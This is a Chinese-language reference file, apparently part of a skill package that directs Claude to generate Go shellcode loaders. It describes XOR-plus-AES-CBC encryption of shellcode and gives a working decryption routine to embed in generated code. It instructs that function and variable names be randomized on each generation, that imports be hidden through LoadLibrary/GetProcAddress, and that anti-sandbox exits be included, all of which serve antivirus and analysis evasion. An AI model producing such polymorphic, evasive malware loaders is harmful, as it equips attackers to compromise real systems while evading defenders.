# 加密解密参考（动态生成版）

## 加密流程（encrypt.go / encrypt_ipv4.go）

**脚本输出格式：**
- stdout 第 1 行：加密后 shellcode（hex 格式 `0xaa,0xbb,...` 或 IPv4 格式 `"1.2.3.4","5.6.7.8",...`）
- stdout 第 2 行：复合密钥 `AES_KEY|XOR_KEY`（两个 32 字符十六进制串，用 `|` 分隔）
- stderr：调试信息（原始长度、密钥、加密后长度）

**加密步骤：**
1. 生成 16 字节随机 XOR 密钥 → hex 编码 → xorKeyStr (32 字符)
2. XOR shellcode with xorKey
3. 生成 16 字节随机 AES 密钥 → hex 编码 → aesKeyStr (32 字符)
4. PKCS7 填充
5. AES-CBC 加密（IV = aesKey[:16]）
6. 输出密文 + 复合密钥

---

## 解密函数（动态生成，嵌入 Go 源码）

**必须集成到生成的 Go 代码中。**

**结构（Claude 每次生成时随机化变量名和代码布局）：**

```go
func <随机名1>(src []byte) []byte {
    length := len(src)
    unpadding := int(src[length-1])
    return src[:(length - unpadding)]
}

func <随机名2>(crypted []byte, keystr string) ([]byte, error) {
    // 分离 AES 密钥和 XOR 密钥
    sep := -1
    for i := 0; i < len(keystr); i++ {
        if keystr[i] == '|' {
            sep = i
            break
        }
    }
    aesKey := []byte(keystr[:sep])
    xorKeyHex := keystr[sep+1:]

    // AES-CBC 解密
    block, err := aes.NewCipher(aesKey)
    if err != nil {
        return nil, err
    }
    blockMode := cipher.NewCBCDecrypter(block, aesKey[:aes.BlockSize])
    plainText := make([]byte, len(crypted))
    blockMode.CryptBlocks(plainText, crypted)
    plainText = <随机名1>(plainText)

    // XOR 解密
    xorKey, _ := hex.DecodeString(xorKeyHex)
    for i := 0; i < len(plainText); i++ {
        plainText[i] ^= xorKey[i%len(xorKey)]
    }
    return plainText, nil
}
```

**随机化要点：**
- 函数名随机（如 `x1`, `m2`, `decode`, `unpack` 等）
- 变量名随机（如 `aesKey` → `ak`, `xorKeyHex` → `xkh` 等）
- 可以内联 PKCS7UnPadding 到 decrypt 中
- for 循环可替换为 range + index 访问

---

## 必须的 import

- `"crypto/aes"` `"crypto/cipher"` `"encoding/hex"` — 加解密核心
- `"syscall"` `"unsafe"` — LoadLibrary/GetProcAddress/SyscallN（IAT 隐藏核心）
- `"os"` `"runtime"` — 抗沙箱退出、CPU 检测

禁止导入 `golang.org/x/sys/windows` 和外部依赖，验证脚本会自动检测。详见 `references/verification.md`。
